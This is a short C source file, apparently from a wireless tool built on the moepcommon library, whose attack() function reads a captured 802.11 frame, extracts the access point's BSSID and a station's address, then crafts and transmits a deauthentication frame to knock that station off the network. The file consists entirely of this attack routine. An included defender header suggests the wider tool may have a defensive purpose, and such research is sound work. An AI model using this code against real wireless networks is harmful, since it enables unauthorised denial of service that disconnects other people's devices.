#include <moepcommon/util.h>
#include <moepcommon/types.h>

#include "attack.h"
#include "deauth.h"
#include "helper.h"
#include "defender.h"
#include "global.h"


int
attack(moep_frame_t frame)
{
	struct ieee80211_hdr_gen *hdr;
	moep_frame_t f;
	u8 hwaddr[IEEE80211_ALEN];
	u8 bssid[IEEE80211_ALEN];

	if (!(hdr = moep_frame_ieee80211_hdr(frame))) {
		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
		return -1;
	}

	if (0 > get_bssid(bssid, hdr)) {
		return -1;
		//LOG(LOG_INFO, "bssid not found");
	}

	if (0 > get_sta_hwaddr(hwaddr, hdr)) {
		return -1;
		//LOG(LOG_INFO, "sta hwaddr not found");
	}

	f = deauth(hwaddr, bssid);
	rad_tx(f);
	LOG(LOG_ERR, "attack!");

	moep_frame_destroy(f);

	return 0;
}

